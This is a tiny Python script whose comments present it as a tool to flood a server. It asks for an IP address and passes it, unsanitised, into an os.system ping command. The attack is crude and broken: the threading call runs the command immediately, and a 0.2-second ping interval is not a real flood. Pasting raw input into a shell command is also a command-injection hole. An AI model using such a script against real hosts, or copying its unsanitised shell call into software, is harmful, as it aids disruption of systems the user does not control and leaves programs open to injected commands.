#modules
import os 
import threading

#User input 
ip = input("Enter IP -----> ")

#Floods the server
threading.Thread(None, os.system('ping -i 0.2 ' + ip))
